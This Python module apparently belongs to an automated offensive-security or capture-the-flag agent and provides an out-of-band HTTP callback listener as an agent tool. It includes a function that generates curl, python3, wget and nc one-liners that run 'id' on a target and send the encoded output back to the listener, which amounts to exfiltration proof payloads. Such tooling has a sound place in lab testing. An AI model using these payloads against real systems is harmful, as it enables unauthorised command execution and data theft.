"""Out-of-band callback listener.

Blind and asynchronous vulnerabilities (SSRF, blind command injection,
runbook/webhook execution, log4shell-style callbacks) can only be verified by
making the target call back to the attacker. darwin previously had no way to
receive that call: a backgrounded ``nc`` inside ``shell_exec`` was killed at
the tool timeout, and the URL handed to the target was ``127.0.0.1`` — which,
inside the target's own container, points at the target itself.

This module owns one in-process HTTP listener per campaign: it binds
``0.0.0.0``, records every request, and reports the callback URLs the target
can actually reach (the host's own IPv4 addresses, including the docker bridge
gateway of the network the target lives on).
"""

from __future__ import annotations

import http.server
import json
import logging
import re
import shutil
import socket
import subprocess
import threading
import time
import uuid
from typing import Any, Dict, List

from darwin.dave import DAVE
from darwin.tools.mcp_gateway import MCPGateway, ToolResult

log = logging.getLogger(__name__)

#: Caps. A listener is an attack surface for us too: bounded ports, bounded
#: hits, bounded payload capture.
MAX_LISTENERS = 2
MAX_HITS = 200
MAX_BODY_BYTES = 8192
MAX_WAIT_SECONDS = 30

_LISTENERS: Dict[str, "OOBListener"] = {}
_LISTENERS_LOCK = threading.Lock()


def _local_ipv4_addresses() -> List[str]:
    """Non-loopback IPv4 addresses of this host, best effort."""
    addrs: set[str] = set()
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            addrs.add(str(info[4][0]))
    except Exception as exc:  # noqa: BLE001 - hostname lookup is best effort
        log.debug("oob_listener: hostname resolution failed: %s", exc)
    if shutil.which("ip"):
        try:
            out = subprocess.run(
                ["ip", "-4", "-o", "addr", "show"],
                capture_output=True, text=True, timeout=5,
            ).stdout
            for line in out.splitlines():
                match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
                if match:
                    addrs.add(match.group(1))
        except Exception as exc:  # noqa: BLE001 - enumeration is best effort
            log.debug("oob_listener: interface enumeration failed: %s", exc)
    if not addrs:
        # Route lookup fallback: a UDP "connect" sends nothing but reveals the
        # source address the kernel would use.
        try:
            probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                probe.connect(("8.8.8.8", 80))
                addrs.add(str(probe.getsockname()[0]))
            finally:
                probe.close()
        except Exception as exc:  # noqa: BLE001 - best effort
            log.debug("oob_listener: route lookup failed: %s", exc)
    return sorted(a for a in addrs if not a.startswith("127."))


def callback_urls(port: int) -> List[str]:
    """URLs the target may use to reach this host on ``port``."""
    urls = [f"http://{addr}:{port}/" for addr in _local_ipv4_addresses()]
    # Never hand back an empty list: loopback is useless for a remote target
    # but it is at least a well-formed value the caller can reason about.
    return urls or [f"http://127.0.0.1:{port}/"]


def callback_payloads(url: str) -> Dict[str, str]:
    """Ready-made one-liners that prove execution by calling ``url`` back."""
    base = url.rstrip("/")
    host_port = base.split("://", 1)[-1]
    return {
        "curl": f"curl -s '{base}/cb?d='$(id | base64 -w0)",
        "python3": (
            "python3 -c \"import base64,subprocess,urllib.request as u;"
            "d=subprocess.run(['id'],capture_output=True,text=True).stdout;"
            f"u.urlopen('{base}/cb?d='+base64.b64encode(d.encode()).decode())\""
        ),
        "sh": f"wget -qO- '{base}/cb?hit=1' >/dev/null 2>&1 || curl -s '{base}/cb?hit=1' >/dev/null",
        "nc": f"echo darwin-oob | nc {host_port.split(':')[0]} {host_port.split(':')[-1]}",
    }


class OOBListener:
    """A single recorded callback listener."""

    def __init__(self, listener_id: str, port: int = 0, host: str = "0.0.0.0") -> None:
        self.listener_id = listener_id
        self.hits: List[Dict[str, Any]] = []
        self._lock = threading.Lock()
        self._server = http.server.ThreadingHTTPServer((host, int(port)), _OOBHandler)
        self._server.daemon_threads = True
        self._server.listener = self  # type: ignore[attr-defined]
        self._server.timeout = 1
        self.port = int(self._server.server_address[1])
        self._thread = threading.Thread(
            target=self._server.serve_forever, kwargs={"poll_interval": 0.2},
            name=f"oob-listener-{listener_id}", daemon=True,
        )

    def start(self) -> None:
        self._thread.start()

    def record(self, method: str, path: str, headers: Dict[str, str],
               body: bytes, remote: str) -> None:
        with self._lock:
            if len(self.hits) >= MAX_HITS:
                return
            text = body[:MAX_BODY_BYTES].decode("utf-8", errors="replace")
            self.hits.append({
                "index": len(self.hits),
                "time": time.strftime("%Y-%m-%dT%H:%M:%S"),
                "remote": remote,
                "method": method,
                "path": path[:500],
                "body": text,
                "flags": DAVE.FLAG_PATTERN.findall(f"{path} {text}"),
            })

    def snapshot(self, since: int = 0, limit: int = 20) -> List[Dict[str, Any]]:
        with self._lock:
            return list(self.hits[since:][:limit])

    def count(self) -> int:
        with self._lock:
            return len(self.hits)

    def stop(self) -> None:
        try:
            self._server.shutdown()
        except Exception as exc:  # noqa: BLE001 - shutdown must never raise
            log.debug("oob_listener: shutdown failed: %s", exc)
        try:
            self._server.server_close()
        except Exception as exc:  # noqa: BLE001
            log.debug("oob_listener: close failed: %s", exc)


class _OOBHandler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *args):  # noqa: D102 - silence stderr spam
        return

    def _handle(self, method: str) -> None:
        try:
            length = int(self.headers.get("Content-Length") or 0)
        except (TypeError, ValueError):
            length = 0
        body = self.rfile.read(length) if length > 0 else b""
        listener = getattr(self.server, "listener", None)
        if listener is not None:
            listener.record(
                method, self.path, dict(self.headers), body,
                self.client_address[0] if self.client_address else "",
            )
        payload = b"ok"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        if method != "HEAD":
            self.wfile.write(payload)

    def do_GET(self):  # noqa: N802
        self._handle("GET")

    def do_POST(self):  # noqa: N802
        self._handle("POST")

    def do_PUT(self):  # noqa: N802
        self._handle("PUT")

    def do_PATCH(self):  # noqa: N802
        self._handle("PATCH")

    def do_DELETE(self):  # noqa: N802
        self._handle("DELETE")

    def do_HEAD(self):  # noqa: N802
        self._handle("HEAD")


def stop_all_listeners() -> int:
    """Stop every listener. Called when a run ends."""
    with _LISTENERS_LOCK:
        listeners = list(_LISTENERS.values())
        _LISTENERS.clear()
    for listener in listeners:
        listener.stop()
    return len(listeners)


def _active_listener(listener_id: str = "") -> "OOBListener | None":
    with _LISTENERS_LOCK:
        if listener_id:
            return _LISTENERS.get(listener_id)
        if len(_LISTENERS) == 1:
            return next(iter(_LISTENERS.values()))
        return None


def register_oob_tools(gateway: MCPGateway) -> None:
    """Register the OOB callback tools on ``gateway``."""

    async def oob_listener(
        action: str = "start", listener_id: str = "", port: int = 0,
        wait_seconds: int = 0, filter: str = "", limit: int = 20,
    ) -> ToolResult:
        """Start / read / stop a callback listener on the darwin host."""
        action = str(action or "start").strip().lower()
        try:
            _limit = max(1, min(int(limit), MAX_HITS))
        except (TypeError, ValueError):
            _limit = 20
        try:
            _wait = max(0, min(int(wait_seconds), MAX_WAIT_SECONDS))
        except (TypeError, ValueError):
            _wait = 0

        if action == "start":
            with _LISTENERS_LOCK:
                if len(_LISTENERS) >= MAX_LISTENERS:
                    return ToolResult(
                        tool_name="oob_listener", success=False, stdout="",
                        stderr=f"{MAX_LISTENERS} listeners already running — stop one first",
                        exit_code=2, elapsed_ms=0,
                    )
                if listener_id and listener_id in _LISTENERS:
                    return ToolResult(
                        tool_name="oob_listener", success=False, stdout="",
                        stderr=f"listener_id '{listener_id}' is already running",
                        exit_code=2, elapsed_ms=0,
                    )
                # Ids must be unique per start: a time-based id collided when the
                # planner started two listeners in the same second.
                _id = listener_id or f"oob-{uuid.uuid4().hex[:6]}"
                try:
                    listener = OOBListener(_id, port=port)
                except Exception as exc:
                    return ToolResult(
                        tool_name="oob_listener", success=False, stdout="",
                        stderr=f"cannot bind port {port}: {exc}",
                        exit_code=1, elapsed_ms=0,
                    )
                _LISTENERS[_id] = listener
            listener.start()
            urls = callback_urls(listener.port)
            body = {
                "status": "listening",
                "listener_id": listener.listener_id,
                "port": listener.port,
                "callback_urls": urls,
                "note": ("Use a URL the TARGET can route to — a docker bridge "
                         "gateway address such as the network's .1, not "
                         "127.0.0.1 (inside the target that is the target itself)."),
                "payloads": callback_payloads(urls[0]),
            }
            return ToolResult(
                tool_name="oob_listener", success=True,
                stdout=json.dumps(body, ensure_ascii=False, indent=1),
                stderr="", exit_code=0, elapsed_ms=0,
            )

        if action == "list":
            with _LISTENERS_LOCK:
                items = [
                    {"listener_id": lst.listener_id, "port": lst.port, "hits": lst.count()}
                    for lst in _LISTENERS.values()
                ]
            return ToolResult(
                tool_name="oob_listener", success=True,
                stdout=json.dumps({"listeners": items}, ensure_ascii=False),
                stderr="", exit_code=0, elapsed_ms=0,
            )

        target = _active_listener(listener_id)
        if target is None:
            return ToolResult(
                tool_name="oob_listener", success=False, stdout="",
                stderr=("no such listener" if listener_id
                        else "no listener running (or several — pass listener_id)"),
                exit_code=2, elapsed_ms=0,
            )

        if action == "stop":
            hits = target.snapshot(limit=_limit)
            with _LISTENERS_LOCK:
                _LISTENERS.pop(target.listener_id, None)
            target.stop()
            return ToolResult(
                tool_name="oob_listener", success=True,
                stdout=json.dumps({"status": "stopped", "hits": hits},
                                  ensure_ascii=False, indent=1),
                stderr="", exit_code=0, elapsed_ms=0,
            )

        if action != "read":
            return ToolResult(
                tool_name="oob_listener", success=False, stdout="",
                stderr=f"unknown action '{action}' (start|read|stop|list)",
                exit_code=2, elapsed_ms=0,
            )

        # read: report hits recorded since the call started, waiting up to
        # wait_seconds for the target's callback to arrive.
        start = target.count()
        deadline = time.monotonic() + _wait
        while _wait and time.monotonic() < deadline:
            time.sleep(0.25)
            if target.count() > start:
                break
        new_hits = target.snapshot(since=start, limit=_limit)
        if not new_hits:
            # A second read must still show what is on record, otherwise a
            # callback that landed between tool calls looks like no callback.
            new_hits = target.snapshot(since=0, limit=_limit)
        if filter:
            new_hits = [
                h for h in new_hits
                if filter.lower() in json.dumps(h, ensure_ascii=False).lower()
            ]
        payload = {
            "listener_id": target.listener_id,
            "port": target.port,
            "total_hits": target.count(),
            "hits": new_hits,
        }
        return ToolResult(
            tool_name="oob_listener", success=bool(new_hits),
            stdout=json.dumps(payload, ensure_ascii=False, indent=1),
            stderr="" if new_hits else "no callback recorded",
            exit_code=0, elapsed_ms=0,
        )

    gateway.register(
        name="oob_listener",
        func=oob_listener,
        description=(
            "Out-of-band callback listener for blind/asynchronous verification "
            "(blind command injection, SSRF, webhook/runbook execution, "
            "exfiltration). Flow: action=start → the target-side payload calls "
            "one of the returned callback_urls → action=read (wait_seconds up to "
            "30) shows what arrived, including any flag. action=stop frees the "
            "listener. The returned payloads dict holds ready-made curl/python3/"
            "sh/nc one-liners. IMPORTANT: hand the target a callback URL it can "
            "route to (a docker gateway address, not 127.0.0.1)."
        ),
        parameters={
            "action": {"type": "string", "description": "start | read | stop | list (default start)"},
            "listener_id": {"type": "string", "description": "Listener id (start may set it; read/stop select it)", "default": ""},
            "port": {"type": "integer", "description": "Port to bind on start (0 = auto)", "default": 0},
            "wait_seconds": {"type": "integer", "description": "For read: wait up to N seconds for a callback (max 30)", "default": 0},
            "filter": {"type": "string", "description": "For read: only keep hits containing this substring", "default": ""},
            "limit": {"type": "integer", "description": "Maximum hits to return", "default": 20},
        },
        domain="web",
    )
